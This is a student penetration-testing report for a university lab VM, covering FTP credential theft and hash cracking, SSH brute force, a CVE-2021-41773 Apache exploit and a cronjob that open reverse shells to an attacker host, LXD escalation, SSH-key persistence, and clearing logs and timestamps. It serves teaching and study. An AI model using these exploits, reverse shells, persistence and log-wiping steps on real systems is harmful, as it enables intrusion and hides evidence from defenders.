<center>
<h1>
Ethical Hacking Lab Assignment
</h1>
 
Penetration testing report<br/>
<b>
Group <code>0xe</code> - Owanesh, zBION1C, Frayu1600
</b><br/>
</center>

---

This is a report for the Ethical Hacking course directed by Daniele Friolo and Davide Guerri for the Academic Year 23/24 at Sapienza University of Rome.

We were given a virtual machine containing deliberate vulnerabilities and to create a written report documenting the machine itself and three different paths to obtain remote access and finally escalate privileges to root user.


# Troubleshooting
As we tried connecting to the `.ova` we were provided, we would not be able to locate the machine, despite attempting to scan every single host of our network interface using nmap
```sh
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -O -A 192.168.1.0/24
```
Even by trying to locate the machine itself by checking our ARP table, as its directly connected to us:
```sh
┌──(kali㉿kali)-[~]
└─$ arp 
```
Which is very odd, as the machine should have obtained an ip address from the DHCP service...

However, after a while, we figured out that the machine *does* in fact have an ip assigned to it: by booting the machine in recovery mode and enabling the `root` console, we in fact found out that in `/etc/netplan` the machine is set up with a static ip `10.0.2.15`, so *without* DHCP, which goes against the requirements of the assignment.
![](images/netplan_trouble.png)
What we did after is removing every file under `/etc/netplan` and then creating a new file `/etc/rc.local` to enable DHCP with following content
```sh
#!/bin/bash
dhclient
exit 0
```
To which we gave `rwx` permissions to root and `r-x` to everyone else
```sh
chmod 755 /etc/rc.local
``` 
Finally, we enabled and restarted the service to save the configuration (may take a while):
```sh
systemctl enable rc-local
systemctl restart rc-local
```
We did **not** tamper with the machine in any other way while in recovery mode, we just needed to perform the above to actually begin with the assignment.

# Scanning and enumeration
We've started from a very quick `nmap` which revealed the following output:

```sh
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -A -O 192.168.56.2

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-03 03:40 EDT
Nmap scan report for 192.168.56.2
Host is up (0.00035s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.180
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           216 Apr 30 12:08 site-credentials.txt
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:dc:bf:b0:43:be:b5:ed:c4:1f:b8:0b:93:01:3a:4a (RSA)
|   256 2d:12:5e:5d:a5:11:18:ec:16:07:b6:ce:ae:7f:14:03 (ECDSA)
|_  256 b8:76:62:9f:68:28:a8:30:d0:87:13:fd:d1:10:aa:df (ED25519)
8080/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.49 (Unix)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
MAC Address: 08:00:27:DF:A3:D9 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.35 ms 192.168.56.2
```
As we can see there are a few open services
- **FTP** on port 21 (with anonymous login available!)
- **SSH** on port 22 
- **Apache** on port 8080 (a webserver)

# Foothold
Let's try establishing foothold by leveraging each path individually. We have color coded them to what we thought the paths were like

## 🟢 via FTP
As we have already said, above FTP allows for anonymous login, so let's do that:
```sh
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.56.2

Connected to 192.168.56.2.
220 (vsFTPd 3.0.5)
Name (192.168.56.2:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
By executing a quick `ls`, we can notice the presence of a file named `site-credentials.txt`, which we will download 
```sh 
ftp> get site-credentials.txt
```
![](images/ftp_login.png)

The file, which landed on `/home/kali`, reports the following:

```txt
┌──(kali㉿kali)-[~/Downloads]
└─$ cat site-credentials.txt 

In case you forget the credentials to upload the files on the website,the IT department provided me with a file containing the password. 
They mentioned a certain MD5 code.

ftp-user 37b4e2d82900d5e94b8da524fbeb33c0
```

Very conveniently, there is password hashed for `ftp-user` with MD5, which is a very unsafe hash function to employ in cryptographic appliances.

We can use our trusty `JohnTheRipper` to crack the hash (which we will put inside `crack.txt` file) using the `rockyou` wordlist:

```sh
┌──(kali㉿kali)-[~]
└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 crack.txt 

Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (?)     
1g 0:00:00:00 DONE (2024-05-31 17:30) 50.00g/s 9600p/s 9600c/s 9600C/s 123456..november
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.  
```
Could `ftp-user` be an SSH user of the target machine? Let's try it:
```sh
┌─(kali㉿kali)-[~]
└─$ ssh ftp-user@192.168.56.2
    football

ftp-user@ubuntulab:~$
```
An unpriviledged shell was obtained: despite being such, we have access to juicy information, such as the mounted disks 
```sh
ftp-user@ubuntulab:~$ lsblk

NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0    7:0    0 49.9M  1 loop /snap/snapd/18357
loop1    7:1    0 91.9M  1 loop /snap/lxd/24061
loop2    7:2    0 38.8M  1 loop /snap/snapd/21465
loop3    7:3    0 63.3M  1 loop /snap/core20/1828
sda      8:0    0  5.2G  0 disk
├─sda1   8:1    0    1M  0 part
├─sda2   8:2    0  500M  0 part /boot
├─sda3   8:3    0  510M  0 part [SWAP]
└─sda4   8:4    0  4.2G  0 part /
sr0     11:0    1 1024M  0 rom
```
and how could we miss the `/etc/passwd` file:
```sh
...
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
ftp:x:114:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
ftp-user:x:1001:1001:,,,:/usr/local/apache24/cgi-bin/:/bin/bash
```
Where we can notice the presence of two interesting users: `ubuntu` and `lxd`

## 🟠 via SSH 
Since SSH is enabled, we tried to enumerate SSH users and guess their passwords by using `hydra`, we could bruteforce both usernames and passwords in one shot by executing the following command

```sh 
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.1.174 ssh
```
Which will take a long time, otherwise we could go by guessing and try the commonly used `ubuntu` username (even without seeing `/etc/passwd` from the previous path) and bruteforce off of it using the following command:
 ```sh
┌──(kali㉿kali)-[~/Desktop]
└─$ hydra -l ubuntu -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.56.2 ssh

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] attacking ssh://192.168.56.2:22/
[22][ssh] host: 192.168.56.2   login: ubuntu   password: admin@123
````
Both paths eventually lead to being able to SSH directly to the machine using username `ubuntu` and password `admin@123`
```sh
┌─(kali㉿kali)-[~]
└─$ ssh ubuntu@192.168.56.2
    admin@123

ubuntu@ubuntulab:~$
```

## 🔴 via Apache
From the scanning and enumeration part we have noticed an Apache 2.4.49 webserver running. We then made a quick `nmap` scan on its port `8080` to check for inspiration in our pentesting adventure:
```sh
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -sV -A 192.168.56.2 --vulners -p8080
```
Many vulnerabilities show up, but a particular one caught our eye: CVE-2021-41773, which would allow remote code execution via path traversal. 

After opening a listener on any ephemeral port on our attackbox, we managed to get a shell as the user `ftp-user` by executing the following code:
 ```sh
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -s -X POST -d "echo; bash -i >& /dev/tcp/[attacker_ip]/[attacker_port] 0>&1" http://192.168.56.4:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash
 ```
Which effectively executes the following `HTTP POST` request 
```sh 
POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash HTTP/1.1 
```
In order for this exploit to work, the server configuration should also contain the following misconfigured directory directive for entire server’s filesystem (or have it missing)
```sh
<Directory />
    Require all granted
</Directory>
```
Additionally, the server would need the `mod_cgi` module enabled.

# Privilege escalation
Now that we've found three different ways to get access to the machine, we will show the paths we found to escalate ourselves to the almighty `root` user.

We first notice the presence of the `.bash_history` file, let's take a peek:
```sh
ftp-user@ubuntulab:~$ cat .bash_history
ls
cd ..
ls
cd ..
sl
lsv
exit
systemctl start apache2
systemctl status apache2.service
journalctl -xe
sudo journalctl -xe
exit
ls
exit
cat /etc/crontab
nano ../scripts/health_check.sh
vi ../scripts/health_check.sh
less ../scripts/health_check.sh
```
in his `/home` there are some files, maybe useful for privilege escalation later on
```sh
ftp-user@ubuntulab:/usr/local/apache24/cgi-bin$ ls
printenv  printenv.vbs	printenv.wsf  test-cgi
```
The story differs whether we achieved foothold with `ftp-user` or `ubuntu`
- `ftp-user` has almost no privileges at all (not a sudoer) 
- `ubuntu` is practically the `root` user with extra steps

We will show below what we've found.


## 🟢 via SSH
When we talked about establishing foothold sia SSH, we managed to crack the password for the `ubuntu` user.

Well, turns out that the aforementioned user has full root privileges.

```sh
ubuntu@ubuntulab:~$ sudo -l

Matching Defaults entries for ubuntu on ubuntulab:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ubuntu may run the following commands on ubuntulab:
    (ALL : ALL) ALL
```
We can `sudo` everything or actually become `root` user by doing `sudo su`, using the same password that we used for foothold (`admin@123`)
```sh
ubuntu@ubuntulab:~$ sudo su

[sudo] password for ubuntu: 
root@ubuntulab:/home/ubuntu#
```
We are aware that this is a very trivial path, but we wanted to include it for completeness nontheless, as it's related to the SSH foothold path.

## 🟠 via Cronjob 
By checking the `crontab` file, we noticed a particular:
```sh
ftp-user@ubuntulab:/home/ubuntu$ cat /etc/crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Health Check Apache Server
*/1 * * * * root /usr/local/apache24/scripts/health_check.sh
```
The last line of the file was set to execute the `health-check.sh` script every minute (`*/1 * * * *`) as `root`, but not only... the script in question is writeable by our current `ftp-user`

```sh
-rwxrw-rw- 1 root ftp-user 415 Apr 30 14:07 /usr/local/apache24/scripts/health_check.sh
```
This is a clear vulnerability that we can leverage to obtain privilege escalation: it was enough to inject a reverse shell onto the file, in this case by LotL - Living off the Land technique using `sh`:

 ```sh
echo "sh -i >& /dev/tcp/[attacker_ip]/[attacker_port] 0>&1" > /usr/local/apache24/scripts/health_check.sh
``` 
Then waiting 1 minute on average for the cron to execute the command and attach to ourselves on the other side on a trusty netcat listener
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 7777
```
Since the file is executed as root, the shell will be a root shell.

## 🔴 via LXD
We noticed the presence of `lxd` from `/etc/passwd`, so we tried exploiting it. We could think about mounting the file system with `root` privileges, but it would require to be `sudoer`. Thankfully, the `ubuntu` user is.

```sh
ubuntu@ubuntulab:~$ lxc init ubuntu:16.04 test -c security.privileged=true 
ubuntu@ubuntulab:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
ubuntu@ubuntulab:~$ lxc start test
ubuntu@ubuntulab:~$ lxc exec test bash

root@test:~# 
```
# Persistence
In order to be persistent in the machine, one of the easiest and most straightforward ways is to leverage SSH. We have generated the SSH keys in our machines:
```sh
┌──(kali㉿kali)-[~]
└─$ ssh-keygen -t rsa -b 4096
```
Then we transfered the public key `id_rsa.pub` into the machine, we did it with `scp` but there are many ways to do it
```sh
┌──(kali㉿kali)-[~]
└─$ scp ~/.ssh/id_rsa.pub ubuntu@192.168.1.174:~/.ssh/id_rsa.pub
```
And we added its content into the `authorized_keys` file
```sh
ubuntu@ubuntulab:~$ cat .ssh/id_rsa.pub >> .ssh/authorized_keys 
```
And now we can login via `ssh` into the `root` account whenever we want (assuming the machine is up and running) and without needing any password.

It's important to note that this will work as long as the server's IP does not change. We are assuming that the server needs an exposed static IP, thus does not change. 

We decided not to include other entry points for persitance because we believe that having few entry points but very stealthy ones is significantly better than having a big amount but obvious ones. Raising any kind of suspicion would trigger immediate action from the defender, who could think about doing a deeper scan on its system or even reinstalling everything from stratch on a new machine, effectively voiding all of our persistance efforts. 

This way, we are maximising the time we are persiting into the target system.

# Clearing our traces
The job would not be complete without a proper cleanup of our traces. 

## Checking for firewall logging rules
When we first enumerated the machine, we made some noise with `nmap`, alongside all the SSH connections we did. The first thing we thought about was checking whether there were any logging rules in `iptables`, and if so, removing them.

In our case there were not.
```sh
root@ubuntulab:~# iptables -L

Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
```

## Restoring files change and access date 
Before changing the `authorized_keys` file, we save its creation and modification date
```sh
stat -c %y authorized_keys > old_mod_time
stat -c %x authorized_keys > old_acc_time
```
Modify it by adding our public key for persistance, then restoring the two dates like so 
```sh
touch -d "$(cat old_mod_time)" authorized_keys
touch -a "$(cat old_acc_time)" authorized_keys
```
And finally every file created in doing so, including `id_rsa.pub` which we put before with `scp`
```sh
rm old_mod_time old_acc_time id_rsa.pub
```
We can also use this method to carefully restore every access and change date, if we really wanted to be stealthy.

## Clearing the logs
Then we cleared all the logs from the system. The logs are stored in `/var/log` and are divided by categories. We decided not to remove the files entirely (as it would raise more concerns victim-side), but to just empty them out
```sh
truncate -s 0 /var/log/auth.log
truncate -s 0 /var/log/cron.log
truncate -s 0 /var/log/httpd
```
The most stealthy approach would be to carefully remove every time anything related to us attackers shows up in them, and subsequently restoring their respective change and access dates.

## Removing bash histories
Finally, we remove any last trace by removing every `.bash_history` file from every user so that all the commands we issued will not be seen.
```sh
rm ~/ftp-user/.bash_history
rm ~/ubuntu/.bash_history
rm ~/root/.bash_history
```
